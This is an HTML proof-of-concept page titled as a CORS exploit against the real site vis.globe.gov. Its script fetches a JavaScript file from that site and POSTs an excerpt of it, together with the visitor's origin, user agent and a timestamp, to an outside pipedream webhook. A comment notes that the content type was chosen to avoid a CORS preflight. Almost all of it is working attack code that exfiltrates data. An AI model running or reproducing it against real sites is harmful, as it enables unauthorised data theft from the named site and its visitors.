<!DOCTYPE html>
<html>
<head><title>CORS Exploit Final</title></head>
<body>
<h2>🔥 Exploiting vis.globe.gov CORS</h2>
<pre id="log">Loading...</pre>

<script>
const webhook = "https://eo6hxedl2p03s10.m.pipedream.net";

function log(msg) {
  document.getElementById("log").textContent += "\n" + msg;
}

(async () => {
  try {
    const res = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js");
    const text = await res.text();

    log("✅ Loaded VISmain.js (status " + res.status + ")");

    const params = new URLSearchParams();
    params.append("origin", location.origin);
    params.append("ua", navigator.userAgent);
    params.append("snippet", text.slice(0, 500));
    params.append("time", new Date().toISOString());

    const send = await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"  // ✅ هذا لا يسبب preflight
      },
      body: params
    });

    log("📤 Webhook POST Status: " + send.status);
  } catch (e) {
    log("❌ Error: " + e.message);
  }
})();
</script>
</body>
</html>
